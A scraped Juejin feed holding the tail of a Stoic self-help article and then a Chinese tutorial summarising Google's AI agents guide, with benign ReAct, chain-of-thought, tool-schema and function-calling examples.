<li><strong>纳瓦尔说：</strong> "Arm yourself with specific knowledge."（用独有知识武装自己）。这种凭本事吃饭的安全感，比依附于某个领导（搞关系）要踏实得多。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">6. 斯多葛主义的心法：控制能控制的 (The Circle of Control)</h3>
<p>在一个庞大的、复杂的、有时候你无法左右规则的社会机器面前，普通人很容易感到无力（Powerlessness）。</p>
<ul>
<li>
<p><strong>建议：</strong> 区分<strong>关注圈</strong>与<strong>影响圈</strong>。</p>
<ul>
<li>你改变不了房价，改变不了延迟退休，改变不了某些宏观政策。天天在网上骂，只会增加你的皮质醇（压力激素），让你生病。</li>
<li><strong>你能控制什么？</strong> 你今晚吃什么？你有没有读 10 页书？你对家人是否和颜悦色？你的专业技能有没有进步？</li>
<li><strong>策略：</strong> <strong>宏观上随遇而安，微观上精进勇猛。</strong> 在你能掌控的那一平米土地上，把它耕种好。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">结语</h3>
<p>作为普通人，在低信任的丛林里，最好的反击不是变得面目可憎，而是： <strong>清醒地独善其身，狡猾地保护自己，温柔地对待家人。</strong></p>
<p>不用去追求改变世界，只要你不被这个世界的混乱吞噬，并保持了内心的秩序（Inner Order），你就已经赢了。</p>
<hr/>
<p>在这个之前我和 AI 有几轮对话，最后才到这个答案上，完整的问答如下：<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2Fshare%2F644e4b52a0a7" target="_blank" title="https://gemini.google.com/share/644e4b52a0a7" ref="nofollow noopener noreferrer">‎Gemini - 直接体验 Google AI 黑科技</a></p>
<p>从我问 “纳瓦尔说的 self-esteem 自尊具体是什么concept？” 开始看。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9059e0f76a4b46a884d7de0bdf1212bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5YW15byg5YGl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943561&amp;x-signature=fjbYkWM0e6cw4cSU0EJXB3e8Iwk%3D" alt="_Gemini-直接体验-Google-AI-黑科技-12-10-2025_11_47_AM.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[5小时整理60页《Google Agent指南》，不懂Agent的包教包会]]></title>    <link>https://juejin.cn/post/7581765536372965385</link>    <guid>https://juejin.cn/post/7581765536372965385</guid>    <pubDate>2025-12-10T03:55:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372965385" data-draft-id="7581765536372949001" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="5小时整理60页《Google Agent指南》，不懂Agent的包教包会"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-10T03:55:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            5小时整理60页《Google Agent指南》，不懂Agent的包教包会
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:55:59.000Z" title="Wed Dec 10 2025 03:55:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<p><em><strong>花了五个小时，把 Google 白皮书拆解成一个可执行的 Agent 心智模型的长文。</strong></em></p>
<p><em><strong>没什么花里胡哨的新名词，但把模型、工具、编排、记忆、训练这几件核心事讲得比较完整，对于想要了解的Agent的初学者，是很不错的选择。</strong></em></p>
<p>Google最近发布了一篇关于Agent长达60页的文件： <strong>《初创公司技术指南：AI Agents》</strong> ，这份报告从宣传来说表达了自己与之前偏理论的文章不一样，他还是暴露了不少细节技巧，对正在做Agent的各位应该有些帮助。</p>
<p><strong>只不过我实际读下来，技巧什么的给的很一般，但是一份非常不错的Agent入门级学习读物</strong>，所以也推荐给大家：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fac9ec61e8e04f5897593ca42dd634e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=T4uFmKwLIpp%2F7YZn1%2BxwomV8YIs%3D" alt="" loading="lazy"/></p>
<p>首先，Agent的能力基石（也就是对工具的调用能力）是模型的Function Calling**，而这个识别工具是否应该被调用的能力是微调训练的结果。</p>
<p>比如，Agent可以使用数据库工具获取客户订单做个性化推荐、根据用户指令调用邮件 API 发送电子邮件、甚至自动执行金融交易...</p>
<p>上述每个功能都需要模型与外部世界（工具、数据）做交互，只要<strong>具备自主规划和多步任务执行能力的系统</strong>，就是Agent。</p>
<h2 data-id="heading-0">Agent架构概览</h2>
<p>再次寄出这章经典Agent架构图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df239a5371c343df963835914e715945~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=eKJ4wdIGJ%2FDxgBi%2BkU2d%2FVJODik%3D" alt="" loading="lazy"/></p>
<p>现代 AI Agent** 通常由四层核心组件构成：</p>
<p><strong>一、模型层：</strong></p>
<p>基础模型（如各类大型语言模型），负责自然语言理解与生成，在生产应用里面往往不会依赖单一模型，甚至会有很多小模型微调场景做其中简单任务。</p>
<p><strong>二、工具层：</strong></p>
<p>外部工具和服务，包含各种API如数据库、搜索引擎等，帮助Agent感知外部世界并执行实际操作。</p>
<p>现阶段来说，Tools是Agent真正的核心，而且<strong>Tools调用不准也是Agent架构最大的难点</strong>，当前我们在生产环境使用<strong>Skills技术 + 强意图</strong>也最多把准确率做到90%左右。</p>
<p>所以，整个Agent的成熟还任重道远。</p>
<p><strong>三、编排层：</strong></p>
<p>Agent的“大脑”，负责编写提示词、执行推理框架、维护对话状态和调用工具。该层实现了智能体的计划、推理、决策和反馈循环。</p>
<p>这样说大家可能听不懂，也就是ReAct架构就是这里的编排层了，也是主要代码组成部分：</p>
<ol>
<li>负责组织历史对话（状态）；</li>
<li>决定什么时候调用模型，什么时候调用工具；</li>
<li>决定什么时候结束推理；</li>
<li>决定怎么拼提示词；</li>
</ol>
<p>他定义“每一轮”里的语言生成结构（Thought、Action、Observation）</p>
<pre><code class="hljs language-scss" lang="scss">... → 推理(Thought) → 行动(Action) → 观察(Observation)  → ...
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c810db4726ae44379b04cb9e011f053c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=nd4WmUVUSyCJzkzlqjmm17M8ygw%3D" alt="" loading="lazy"/></p>
<p>ReAct = Reason + Act：</p>
<ol>
<li><strong>Reasoning：</strong> 让LLM**思考"为什么"和"如何"执行行动；</li>
<li><strong>Acting：</strong> 让LLM执行具体行动并与环境交互；</li>
<li><strong>循环反馈：</strong> 通过观察结果驱动下一步推理；</li>
</ol>
<p><strong>四、记忆层：</strong></p>
<p>包括短期记忆（对话上下文、近期交互）和长期记忆（知识库、历史数据、个人偏好等）。记忆层用于存储和检索与任务相关的信息，以支持多轮交互和知识补充：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11c44944fc6044c292951537d1a7fddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=VN%2FJfljkcXLhM8R4LM43J%2BrWnOI%3D" alt="" loading="lazy"/></p>
<p>严格来说，Agent最恼火的就是记忆层的处理，这也是上下文工程的本身，他需要解决<strong>数据应该如何与AI交互，保证每次AI都能拿到相关数据。</strong> 这里展开有三点：</p>
<ol>
<li><strong>每次检索能不能拿到对应的数据</strong>；</li>
<li><strong>数据是不是合适</strong>，这块的合适包括会不会多、会不会少，多了费Token是小事，但可能干扰模型、少了就容易出问题；</li>
<li><strong>生成对不对</strong>，这个建立在检索正确，数据组织正确的情况下，模型最终输出是不是符合预期；</li>
</ol>
<p>这里是整体的交互架构图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85d93ace4b3d4da1aaef1ac83e0f8f2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=XoXdTtPLSLkj8aOWxKuL%2BonzJw8%3D" alt="" loading="lazy"/></p>
<p>图示而言，Agent执行流程可概括为：<strong>用户输入 → 编排层处理 → 模型生成思路 → 决策调用工具或输出结果 → 工具执行获得反馈 → 更新记忆并继续循环，直至目标完成</strong>。</p>
<p>在 ReAct 框架下，Agent重复执行<strong>思考（Thought）→行动（Action）→观察（Observation）</strong> 的循环，直到产生最终答案。</p>
<p>最后，与单纯的模型（LLM）相比，Agent有以下关键区别：</p>
<ol>
<li><strong>知识来源：</strong> 模型只能依赖于训练数据，知识静态；而Agent通过工具扩展知识，可以实时访问外部信息。</li>
<li><strong>上下文管理：</strong> 模型单次推理没有会话记忆；Agent可以维护交互历史，实现多轮连续对话。</li>
<li><strong>推理框架：</strong> 模型输出结果往往依赖单一提示；Agent具备内置的认知架构和推理策略（如链式思维、反思框架、树式思维等），能够在编排层中循环迭代推理步骤；</li>
</ol>
<p>接下来我们具体展开说下Agent的四个核心组件：</p>
<h2 data-id="heading-1">编排层与认知架构</h2>
<p>编排层是智能体系统的核心控制单元，负责组织信息流和执行推理循环。它模拟人类在做复杂任务时的认知过程：先获取信息、然后制定计划、执行行动、再根据反馈调整计划，不断循环直到完成目标。</p>
<p>一个常见的比喻是 <strong>“厨师准备复杂菜品”</strong> ：厨师会根据顾客需求获取食材信息，思考烹饪步骤，然后实际烹饪，过程中可能根据味道反馈不断调整方法。</p>
<p>类似的，Agent的编排层会按照设定的推理框架反复迭代，驱动模型生成“思考”并做出“行动”决策。</p>
<p>常见的推理框架大同小异，这里一定需要了解的是两个东西**ReAct与CoT****，除此之外可以延伸到ToT：</p>
<p><strong>ReAct</strong>在前面我们做了基础介绍，该框架<strong>强调模型在回答前进行连续的内省和行动选择，有助于提高答案的准确度和可追溯性</strong>；</p>
<p><strong>CoT（思维链）</strong> 引导模型通过生成中间推理步骤来分解问题，促使其在最终答案前先列举思考过程，这种框架可以<strong>增强模型解决复杂问题时的准确性</strong>（幻觉问题）。</p>
<p><strong>ToT（思维树）</strong> 是在 CoT 的基础上，允许模型在多个备选思路间做比较，适用于需要探索多种方案的策略性任务，目的依旧是提升对复杂问题的解决能力。</p>
<p>篇幅有限，我们只讨论ReAct和CoT的配合即可（其他的都类似）：</p>
<h3 data-id="heading-2">ReAct和CoT</h3>
<p>首先，ReAct与CoT都是推理策略框架也就是Agent四大组件核心的编排层具象化实现，他们都描述的是<strong>如何组织模型的推理过程、生成步骤、提示词结构。</strong></p>
<p>换句话说，ReAct是代码的核心，是AI工程的核心，他会决定如何去与记忆系统、工具系统做配合。</p>
<p>然后，ReAct逻辑上与CoT是同级别的，但现在更多的是在组合使用，显得CoT是ReAct的一个过程产物，其实并不是的，逻辑上CoT也可以调用工具；</p>
<p>只不过现在从流行范式的角度来说，ReAct被用作主框架的时间会多一点，并且过程中会包含很多CoT的部分，这里的结果是：<strong>ReAct 是容器，CoT 是内容。ReAct 是最“Agent”化的、CoT 是最基础的</strong>。</p>
<blockquote>
<p>ReAct 规定了：先思考（Thought）→ 行动（Action）→ 等待结果（Observation）→ 再思考...</p>
<p>而这个“Thought”怎么写？通常就是一个 Chain of Thought 推理块。</p>
</blockquote>
<p>举个简单例子：</p>
<p>让 Agent 回答 <strong>“某公司员工请假流程”</strong> 的问题，Agent 需要：</p>
<ol>
<li>读取用户的问题</li>
<li>从知识库中检索文档</li>
<li>分析内容结构</li>
<li>输出清晰步骤</li>
</ol>
<p>这块的简要流程是：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">User:</span> 请问我们公司请假流程是什么？

<span class="hljs-keyword">Step</span> <span class="hljs-number">1</span>:
<span class="hljs-symbol">Thought:</span> 先查找关于“请假流程”的文档。
<span class="hljs-symbol">Action:</span> search_docs(<span class="hljs-string">"请假流程"</span>)
<span class="hljs-symbol">Observation:</span> 找到文档《员工手册》第<span class="hljs-number">4</span>章，列出了流程步骤。

<span class="hljs-keyword">Step</span> <span class="hljs-number">2</span>:
<span class="hljs-symbol">Thought:</span>
首先读取这部分内容，理解流程的顺序。
- 第一步是员工提交请假申请
- 第二步是直属上级审批
- 第三步是HR备案
因此我可以组织一份清晰的回答。

<span class="hljs-symbol">Action:</span> None
Final Answer: 请假流程如下：<span class="hljs-number">1</span>）提交申请；<span class="hljs-number">2</span>）主管审批；<span class="hljs-number">3</span>）HR备案。
</code></pre>
<p>这个 “Step 2” 的 Thought 部分就是一个简单的 <strong>CoT</strong>，模型在没有行动前，分步思考、提取、组织信息，这是典型的思维链。</p>
<p>为什么这么用也很简单：Agent架构中也不可能每一步都调用工具，很多时候只是在“组织思维/语言”，CoT可以有效降低幻觉率。</p>
<p>总而言之，ReAct 框架里可以有很多 CoT 内容穿插其中，这种组合也是最常见、最稳的做法，大家记住这点就行，这就是Agent的编排层。</p>
<p>再结合Google报告的案例，大家应该可以完全理解了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfd9939ee3b141d296e4fae73b7f54ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=fGZpBQ7c5Oj4nGPHSw6WtkXRNiY%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">User: 我想订一张下周从北京到上海的机票。</span>
<span class="hljs-section">Thought: 我需要查询航班信息并进行比较。</span>
<span class="hljs-section">Action: 调用【航班搜索】工具</span>
Action Input: {<span class="hljs-string">"from"</span>: <span class="hljs-string">"北京"</span>, <span class="hljs-string">"to"</span>: <span class="hljs-string">"上海"</span>, <span class="hljs-string">"date"</span>: <span class="hljs-string">"下周"</span>}
<span class="hljs-section">Observation: 航班工具返回了多班次航班信息。</span>
<span class="hljs-section">Thought: 我应该挑选价格和时间合适的航班。</span>
Final Answer: 根据查询结果，下周从北京到上海的航班有...（列出信息）。
</code></pre>
<h3 data-id="heading-3">状态管理</h3>
<p>除基本框架之外，编排层还负责维护<strong>交互状态和历史记忆</strong>。</p>
<p>与模型的单轮对话不同，Agent需要管理对话历史，将先前的对话内容、用户指令和工具反馈纳入状态，否则的话多轮对话就会胡言乱语。</p>
<p>例如，在咨询类对话中，Agent会记住用户之前的问题和上下文，不断积累信息，这对解决复杂问题和提供连续服务至关重要。</p>
<p>总之，编排层就像Agent的“大脑”，通过循环的反馈机制和提示工程框架，引导模型合理利用已有信息和工具一步步实现目标。</p>
<p>状态管理好坏直接关系到Agent产品的最终表现，只不过这里的<strong>状态管理极其困难</strong>，如果展开的话万字都拿不下来...</p>
<h2 data-id="heading-4">工具体系</h2>
<p><strong>工具是模型与外部世界之间的桥梁，使得Agent可以访问并处理真实信息</strong></p>
<p>根据我之前的实践经验：<strong>Agent最难的部分是状态管理，最烦（不稳定）的部分是意图识别，工作量最大的部分是工具体系...</strong></p>
<p>常见的工具类型包括 扩展（Extensions）、函数调用（Functions） 和 数据存储（Data Stores） 等，它们各自承担不同职责，共同构建了智能体与外部环境交互的能力。下面分别介绍这几种工具类型:</p>
<h3 data-id="heading-5">扩展</h3>
<p>所谓扩展也就是<strong>提前配置好的一批可调用 API 模块 + 模型能看懂的调用说明</strong>，其底层基础是模型的Function Calling，目的是让模型不需要知道很多 API 的细节，只需要给关键词：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">Action:</span> 航班查询  
Action Input: {<span class="hljs-keyword">from</span>: <span class="hljs-string">"北京"</span>, <span class="hljs-keyword">to</span>: <span class="hljs-string">"上海"</span>, <span class="hljs-type">date</span>: <span class="hljs-string">"2025-12-10"</span>}
</code></pre>
<p>这里再给一个配置信息：</p>
<pre><code class="hljs language-css" lang="css">{
  "name": <span class="hljs-string">"search_flights"</span>,
<span class="hljs-string">"description"</span>: <span class="hljs-string">"查询指定日期的航班信息"</span>,
<span class="hljs-string">"params"</span>: {
    "<span class="hljs-selector-tag">from</span>": <span class="hljs-string">"出发城市"</span>,
    <span class="hljs-string">"to"</span>: <span class="hljs-string">"目的城市"</span>,
    <span class="hljs-string">"date"</span>: <span class="hljs-string">"出发日期（YYYY-MM-DD）"</span>
  },
"example_calls": [
    {
      "user_input": <span class="hljs-string">"我想查明天从北京飞上海的航班"</span>,
      <span class="hljs-string">"action"</span>: <span class="hljs-string">"search_flights"</span>,
      <span class="hljs-string">"action_input"</span>: {
        "<span class="hljs-selector-tag">from</span>": <span class="hljs-string">"北京"</span>,
        <span class="hljs-string">"to"</span>: <span class="hljs-string">"上海"</span>,
        <span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-10"</span>
      }
    }
  ]
}
</code></pre>
<h3 data-id="heading-6">函数调用</h3>
<p>函数调用与扩展类似（都是Function Calling），也是提供给模型调用外部功能的接口，但它更侧重于客户端（应用端）执行，而不是在智能体服务器端：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71b945df5503481790e221b91ec8149a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=B7gCCfxdYp5s8eb7jnDzHUBeCf0%3D" alt="" loading="lazy"/></p>
<p>与扩展对比的主要差别在于，扩展在智能体端执行调用外部服务，而函数在客户端执行。这意味着即使模型选择了某个函数，实际的 API 调用可能会在另一个服务层面完成。</p>
<p>这里大家读起来可能有点绕，因为扩展和函数相似度很高，我们这里做下举例说明：</p>
<p>扩展属于系统自己干，你说“帮我查天气”，它自己调接口、自己拿数据、自己干：</p>
<pre><code class="hljs">模型：我需要查下天气
Agent系统：好的，我有手，我来调 API weather.com 获取数据
</code></pre>
<p>函数是模型自己不做事，它只是告诉你“你去做”：</p>
<pre><code class="hljs language-scss" lang="scss">模型：我建议调用函数 <span class="hljs-built_in">playVideo</span>({videoId: <span class="hljs-number">123</span>})
应用前端：收到，我来执行这个函数（比如调播放器）
</code></pre>
<p>这种差异的原因是<strong>安全性、离线、异步</strong>等原因，中断式调用用函数，非中断式用扩展：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 扩展案例：</span>
Action: query_weather
Action Input: {<span class="hljs-string">"city"</span>: <span class="hljs-string">"北京"</span>, <span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-10"</span>}

<span class="hljs-comment"># Agent系统逻辑（自动执行）：</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">agent_runtime</span>():
    <span class="hljs-keyword">if</span> action == <span class="hljs-string">"query_weather"</span>:
        result = requests.get(<span class="hljs-string">f"https://api.weather.com?city=<span class="hljs-subst">{city}</span>&amp;date=<span class="hljs-subst">{date}</span>"</span>)
        send_back_to_model(result)

<span class="hljs-comment"># 函数案例，中断式：</span>
Function Call: open_camera
Args: {<span class="hljs-string">"resolution"</span>: <span class="hljs-string">"1080p"</span>}

<span class="hljs-comment"># 客户端 / 浏览器执行（你来写）：</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">on_function_call</span>(<span class="hljs-params">fn_name, args</span>):
    <span class="hljs-keyword">if</span> fn_name == <span class="hljs-string">"open_camera"</span>:
        open_webcam(args[<span class="hljs-string">"resolution"</span>])
</code></pre>
<h3 data-id="heading-7">数据存储</h3>
<p>数据存储为Agent提供了“长期记忆”和知识库的功能，特别适用于需要查询大量结构化或非结构化信息的场景。</p>
<p>核心思想是将外部文档或数据库转换成向量索引，让模型通过检索来获取最新内容，从而扩展其知识边界。常见做法是构建向量库或知识库，将文档、网页、表格等预处理为高维嵌入存储：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93147f49be054d0783f8fffc027399dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=Ih4vURUZ%2BPxMiupYXOCvSpwJRNI%3D" alt="" loading="lazy"/></p>
<p>例如，对于公司内部知识库问答，智能体会先将用户问题转换为向量并检索预索引的内部文档，得到的相关文档段落作为补充信息提供给模型。这样，生成的回答就基于最新的业务手册或法规文本，而不是仅凭模型训练时有限的数据。</p>
